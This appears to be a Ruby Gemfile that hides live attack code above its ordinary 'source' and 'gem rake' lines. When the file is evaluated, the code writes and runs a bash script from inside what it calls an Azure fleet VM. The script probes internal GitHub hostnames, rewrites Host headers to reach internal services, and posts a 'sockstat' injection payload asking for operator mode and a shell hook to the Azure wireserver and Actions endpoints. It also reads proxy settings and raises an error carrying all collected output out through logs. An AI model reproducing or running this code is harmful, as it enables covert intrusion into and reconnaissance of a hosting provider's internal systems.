require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v200; rm -rf "$WD" && mkdir "$WD" && cd "$WD"

# Probe internal gitauth + babeld + gitrpcd hostnames from inside the Azure fleet VM
echo "=== Internal service hostname probes from fleet VM ==="
for HOST in \
  gitauth.service.azure-eastus.github.net \
  gitauth-prod.service.azure-eastus.github.net \
  babeld.service.azure-eastus.github.net \
  babeld-prod.service.azure-eastus.github.net \
  gitrpcd.service.azure-eastus.github.net \
  gitrpcd-prod.service.azure-eastus.github.net \
  spokes.service.azure-eastus.github.net \
  spokes-receive-pack.service.azure-eastus.github.net \
  github-internal.service.azure-eastus.github.net \
  internal-api.service.azure-eastus.github.net \
  gitauth.actions.githubusercontent.com \
  babeld.actions.githubusercontent.com \
  gitauth.githubapp.com \
  babeld.githubapp.com \
  ; do
  RES=$(curl -sf -m 4 -o /dev/null -w "%{http_code}" "https://$HOST/" 2>/dev/null)
  CONNECT=$(curl -sf -m 4 -o /dev/null -w "%{http_code}" "https://$HOST/_status" 2>/dev/null)
  echo "  $HOST: /=$RES /_status=$CONNECT"
done

# DNS resolve test
echo ""
echo "=== DNS resolve check ==="
for HOST in \
  gitauth.service.azure-eastus.github.net \
  gitauth.githubapp.com \
  babeld.service.azure-eastus.github.net \
  internal-api.github.com \
  github.net \
  ; do
  IP=$(getent hosts "$HOST" 2>/dev/null | awk '{print $1}' | head -1)
  echo "  $HOST → ${IP:-NXDOMAIN}"
done

# Probe via curl using "Host:" header rewrite — F034-style host-header routing
echo ""
echo "=== Host-header rewrite to internal services ==="
for HOST in \
  gitauth.service.azure-eastus.github.net \
  babeld.service.azure-eastus.github.net \
  hosted-compute-request-orchestrator-prod-eus-02.service.azure-eastus.github.net \
  ; do
  curl -s -m 5 -H "Host: $HOST" -o resp.txt -w "Host=$HOST HTTP=%{http_code} LEN=%{size_download}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/_status"
  head -c 200 resp.txt
  echo ""
done

# Try POST sockstat injection to common endpoints
echo ""
echo "=== Sockstat injection POST probes ==="
PAYLOAD='{"sockstat":["stat=user_operator_mode=true","stat=rails_env=development","stat=custom_hooks_dir=/tmp/benty","stat=repo_pre_receive_hooks=[{\"script\":\"/bin/sh\"}]"]}'
for URL in \
  "http://168.63.129.16/commit_refs" \
  "http://168.63.129.16/gitauth/commit_refs" \
  "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/commit_refs" \
  "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/gitauth/commit_refs" \
  "https://hosted-compute-watchdog-prod-eus-02.githubapp.com/commit_refs" \
  "https://pipelinesghubeus5.actions.githubusercontent.com/commit_refs" \
  "https://pipelinesghubeus5.actions.githubusercontent.com/gitauth/commit_refs" \
  ; do
  curl -s -m 5 -X POST -H "Content-Type: application/json" -d "$PAYLOAD" -o body.txt -w "$URL HTTP=%{http_code} LEN=%{size_download}\n" "$URL"
done

# Check the dependabot proxy itself for an internal API
echo ""
echo "=== Dependabot proxy internal endpoints ==="
# Find the dependabot proxy local address
PROXY=$(env | grep -i proxy | head -3)
echo "PROXY env: $PROXY"
# Common: 127.0.0.1:1080 or local proxy
for P in /commit_refs /gitauth /_internal /update_jobs/1/sockstat; do
  curl -s -m 5 -o body.txt -w "127.0.0.1:1080$P HTTP=%{http_code}\n" "http://127.0.0.1:1080$P"
done

# Probe what github.net subdomains resolve from inside Azure
echo ""
echo "=== Resolve .github.net from inside Azure VM ==="
for SUB in \
  service.iad.github.net \
  service.azure-eastus.github.net \
  service.azure-eastus2.github.net \
  azure-eastus2.github.net \
  iad.github.net \
  ; do
  IP=$(getent hosts "$SUB" 2>/dev/null | awk '{print $1}' | head -1)
  echo "  $SUB → ${IP:-NXDOMAIN}"
done
SHELL
Tempfile.create('v200.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v200 " + line.chomp[0..1500] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
